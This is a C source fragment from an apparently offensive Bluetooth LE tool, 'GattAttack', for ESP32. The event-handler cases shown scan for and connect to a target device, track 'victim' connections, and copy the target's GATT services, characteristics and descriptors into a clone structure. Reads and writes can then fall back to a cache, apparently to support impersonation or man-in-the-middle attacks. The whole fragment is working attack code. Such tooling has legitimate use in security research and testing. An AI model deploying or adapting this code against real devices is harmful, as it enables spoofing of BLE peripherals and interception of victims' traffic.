// Included in GattAttack.c to share callback state within one C translation unit.
  case ESP_GATTC_REG_EVT: {
    /**
     * After our attacking
     * client is created we
     * need to set our clone
     * interface and begin
     * scanning for our
     * target device.
     */
    clone.gattc_if = gattc_if;
    clone.services = NULL;
    clone.num_services = 0;

    esp_err_t scan_ret = esp_ble_gap_set_scan_params(&ble_scan_params);
    if (scan_ret) {
      ESP_LOGE(TAG, "set scan params error, error code = %x", scan_ret);
    }

    break;
  }
  case ESP_GATTC_CONNECT_EVT: {
    /**
     * Occurs whenever a physical
     * BLE connection is established.
     *
     * It can either be a victim device
     * or the same device connecting back
     * to us in some cases (that might not
     * be handled)
     *
     * We also do a MTU request here.
     */
    ESP_LOGI(TAG, "Connection:");
    esp_log_buffer_hex(TAG, param->connect.remote_bda, sizeof(esp_bd_addr_t));

    if (memcmp(clone.target_bda, param->connect.remote_bda, sizeof(clone.target_bda)) == 0) {
      connected = true;
      connecting = false;
      gatt_send_output("Target Device Client Connected.", false);
      gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECTED;
      gatt_send_state((int)gattAttackState);
      clone.target_client_conn_id = param->connect.conn_id;

    } else {
      gatt_send_output("Victim Device Connected", false);
      clone.victim_client_conn_id = param->connect.conn_id;
    }

    if (param->connect.conn_id == clone.target_client_conn_id) {
      esp_err_t mtu_ret = esp_ble_gattc_send_mtu_req(gattc_if, param->connect.conn_id);
      if (mtu_ret)
        ESP_LOGE(TAG, "config MTU error, error code = %x", mtu_ret);
    }
    break;
  }
  case ESP_GATTC_DISCONNECT_EVT: {
    /**
     * This event comes when either
     * our victim or attacking client
     * is disconnected.
     *
     * If it is our attacking client
     * we attempt to reconnecting
     * up the the MAX_ATTEMPTS.
     */
    ESP_LOGI(TAG,
             "ESP_GATTC_DISCONNECT_EVT, disconnect reason 0x%x (%i) conn_id: %x - "
             "%02x:%02x:%02x:%02x:%02x:%02x:",
             param->disconnect.reason, param->disconnect.reason, param->disconnect.conn_id,
             param->disconnect.remote_bda[0], param->disconnect.remote_bda[1],
             param->disconnect.remote_bda[2], param->disconnect.remote_bda[3],
             param->disconnect.remote_bda[4], param->disconnect.remote_bda[5]);

    /**
     * If disconnect is the bda of our
     * upstream device, reconnect
     */
    if (memcmp(clone.target_bda, param->disconnect.remote_bda, 6) == 0) {
      gatt_send_output("Lost Client Connection", false);
      connected = false;
      finish_pending_write(ESP_GATT_ERROR);

      if (retries < MAX_RETRIES) {
        if (!shutdown_gatt_attack) {
          retries++;
          char out[45];
          sprintf(out, "Target Connect Retry %i/%i", retries, MAX_RETRIES);
          gatt_send_output(out, false);
          esp_ble_gap_set_scan_params(&ble_scan_params);
        }
      } else {
        if (!clone_init) {
          shutdown_gatt_attack = true;
          gatt_send_output("Attack Failed :(", false);
          gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECT_FAIL;
          gatt_send_state((int)gattAttackState);
        } else {
          gatt_send_output("Giving up reconnecting to target. Read/writes will happen from cache",
                           false);
        }
      }
    } else {
      gatt_send_output("Lost Victim Connection", false);
    }

    break;
  }
  case ESP_GATTC_OPEN_EVT: {
    /**
     * Event comes when a virtual
     * GATT connection is setup.
     *
     * Only used for logging failures
     * atm.
     */
    if (param->open.status != ESP_GATT_OK) {
      ESP_LOGE(TAG, "Open Target connection failed: %d", param->open.status);
      connected = false;
      connecting = false;
      break;
    }

    break;
  }
  case ESP_GATTC_CFG_MTU_EVT: {
    /**
     * Comes when the clients MTU
     * is set or updated.
     */
    if (param->cfg_mtu.status != ESP_GATT_OK) {
      ESP_LOGE(TAG, "config mtu failed, error status = %x", param->cfg_mtu.status);
    }
    ESP_LOGI(TAG, "ESP_GATTC_CFG_MTU_EVT, Status %d, MTU %d, conn_id %d", param->cfg_mtu.status,
             param->cfg_mtu.mtu, param->cfg_mtu.conn_id);
    clone.target_gattc_mtu = param->cfg_mtu.mtu;
    break;
  }
  case ESP_GATTC_DIS_SRVC_CMPL_EVT: {
    /**
     * Event comes after the connected
     * attacking client has finished
     * discovering the services on the
     * target device.
     *
     * We call esp_ble_gattc_search_service
     * and gather the actual services in the
     * ESP_GATTC_SEARCH_RES_EVT.
     */
    if (param->dis_srvc_cmpl.status != ESP_GATT_OK) {
      ESP_LOGE(TAG, "discover service failed, status %d", param->dis_srvc_cmpl.status);
      break;
    }
    gatt_send_output("Discover Services Complete!", false);
    esp_ble_gattc_search_service(gattc_if, param->dis_srvc_cmpl.conn_id, NULL);
    break;
  }
  case ESP_GATTC_SEARCH_RES_EVT: {
    /**
     * This event comes after the
     * Service Discovery is completed.
     *
     * Here is where we actually clone
     * all services, chars, and descriptors
     * to our clone struct.
     */
    if (!clone_init) {
      // ESP_LOGI(TAG, "SEARCH RES: conn_id = %x is primary service %d", param->search_res.conn_id,
      // param->search_res.is_primary); ESP_LOGI(TAG, "start handle %d end handle %d current handle
      // value %d", param->search_res.start_handle, param->search_res.end_handle,
      // param->search_res.srvc_id.inst_id); ESP_LOGI(TAG, "Service UUID: %x",
      // param->search_res.srvc_id.uuid.uuid.uuid16);

      uint8_t handles = param->search_res.end_handle - param->search_res.start_handle;

      if (last_end_handle) {
        handles += (param->search_res.start_handle - last_end_handle);
      }

      last_end_handle = param->search_res.end_handle;

      service_t service1 = {
          .service_uuid = param->search_res.srvc_id.uuid,
          .service_handle = param->search_res.srvc_id.inst_id,
          .start_handle = param->search_res.start_handle,
          .end_handle = param->search_res.end_handle,
          .chars = NULL,
          .num_chars = 0,
          .num_handles = handles,
      };

      if (!add_service(&service1))
        break;
      service_num = clone.num_services - 1;

      uint16_t count = 0;
      esp_gatt_status_t status = esp_ble_gattc_get_attr_count(
          gattc_if, param->search_res.conn_id, ESP_GATT_DB_CHARACTERISTIC,
          param->search_res.start_handle, param->search_res.end_handle, 0, &count);
      if (status != ESP_GATT_OK) {
        ESP_LOGE(TAG, "esp_ble_gattc_get_attr_count error");
        break;
      }

      if (count > 0) {
        esp_gattc_char_elem_t *char_result =
            (esp_gattc_char_elem_t *)malloc(sizeof(esp_gattc_char_elem_t) * count);
        if (!char_result) {
          ESP_LOGE(TAG, "gattc no mem");
          break;
        } else {
          status = esp_ble_gattc_get_all_char(gattc_if, param->search_res.conn_id,
                                              param->search_res.start_handle,
                                              param->search_res.end_handle, char_result, &count, 0);
          if (status != ESP_GATT_OK) {
            ESP_LOGE(TAG, "esp_ble_gattc_get_all_char %s", esp_err_to_name(status));
            free(char_result);
            break;
          }

          for (int i = 0; i < count; i++) {
            /*
            ESP_LOGI(TAG, "Char UUID: %x (%x)",
                    char_result[i].uuid.uuid.uuid16,
                    char_result[i].char_handle);
            */
            char_t char1 = {
                .char_uuid = char_result[i].uuid,
                .char_handle = char_result[i].char_handle,
                .property = char_result[i].properties,
                .descs = NULL,
                .num_descs = 0,
            };

            if (!add_characteristic(&clone.services[service_num], &char1))
              break;

            uint16_t desc_count = 0;
            status = esp_ble_gattc_get_attr_count(gattc_if, param->search_res.conn_id,
                                                  ESP_GATT_DB_DESCRIPTOR, 0, 0,
                                                  char_result[i].char_handle, &desc_count);
            if (status != ESP_GATT_OK) {
              ESP_LOGE(TAG, "esp_ble_gattc_get_attr_count(DESCRIPTOR) error");
            }

            if (status == ESP_GATT_OK && desc_count > 0) {
              esp_gattc_descr_elem_t *descr_result =
                  (esp_gattc_descr_elem_t *)calloc(desc_count, sizeof(esp_gattc_descr_elem_t));
              if (!descr_result)
                break;
              status = esp_ble_gattc_get_all_descr(gattc_if, param->search_res.conn_id,
                                                   char_result[i].char_handle, descr_result,
                                                   &desc_count, 0);
              if (status != ESP_GATT_OK) {
                ESP_LOGE(TAG, "%s", esp_err_to_name(status));
                ESP_LOGE(TAG, "esp_ble_gattc_get_all_descr error");
                free(descr_result);
                break;
              }

              if (desc_count > 0) {
                for (int x = 0; x < desc_count; x++) {
                  /**
                  ESP_LOGI(TAG, "   Desc UUID: %x (%x)",
                          descr_result[x].uuid.uuid.uuid16,
                          descr_result[x].handle);
                  */
                  desc_t desc1 = {.desc_uuid = descr_result[x].uuid,
                                  .desc_handle = descr_result[x].handle,
                                  .value = {.attr_max_len = 0x36},
                                  .perm = 0};

                  add_descriptor(&clone.services[service_num].chars[i], &desc1);
                }
              }
              free(descr_result);
            }
          }
          free(char_result);
        }
      }

      service_num += 1;
    }
    break;
  }
